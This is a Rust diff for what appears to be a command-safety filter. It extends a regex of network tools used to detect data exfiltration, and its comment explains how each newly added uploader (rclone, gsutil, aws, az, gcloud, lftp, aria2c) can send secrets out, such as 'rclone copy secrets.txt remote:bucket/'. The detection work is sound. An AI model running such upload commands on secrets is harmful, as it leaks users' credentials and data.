@@ -2937,12 +2937,27 @@ fn env_dumper_word_regex() -> &'static regex::Regex {
 
 /// Whole-word network-tool regex, compiled once. Union of
 /// `EXFIL_NETWORK_TOOLS` members with `\b` boundaries.
+///
+/// 1.2.1 M-2 adversarial review: added `aria2c`, `lftp`, `rclone`,
+/// `gsutil`, `aws`, `az`, `gcloud`. Each of these will upload a local
+/// file (or stdin) to a remote endpoint as readily as `curl -T` /
+/// `scp` / `rsync`:
+///
+/// - `aria2c <url>` / `aria2c --out` — a multi-protocol download AND
+///   upload tool with FTP/SFTP/HTTP support.
+/// - `lftp` — scripted FTP/HTTP/SFTP client that can `put` local files.
+/// - `rclone` / `gsutil` — cloud-storage movers (S3, GCS, Azure,
+///   Dropbox, …); `rclone copy secrets.txt remote:bucket/` is a clean
+///   exfil channel.
+/// - `aws s3 cp -` / `aws s3api put-object` — AWS CLI uploader.
+/// - `az storage blob upload` — Azure equivalent.
+/// - `gcloud storage cp` — GCP equivalent.
 fn network_tool_word_regex() -> &'static regex::Regex {
     static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
     RE.get_or_init(|| {
         // Keep this in lock-step with EXFIL_NETWORK_TOOLS.
         regex::Regex::new(
-            r"(?i)\b(?:curl|wget|nc|ncat|netcat|socat|dig|host|nslookup|drill|resolvectl|scp|rsync|sftp|ftp|tftp|http|https|httpie|xh|mail|sendmail|mutt|ssh)\b",
+            r"(?i)\b(?:curl|wget|nc|ncat|netcat|socat|dig|host|nslookup|drill|resolvectl|scp|rsync|sftp|ftp|tftp|http|https|httpie|xh|mail|sendmail|mutt|ssh|aria2c|lftp|rclone|gsutil|aws|az|gcloud)\b",
         )
         .expect("network-tool regex compiles")
     })
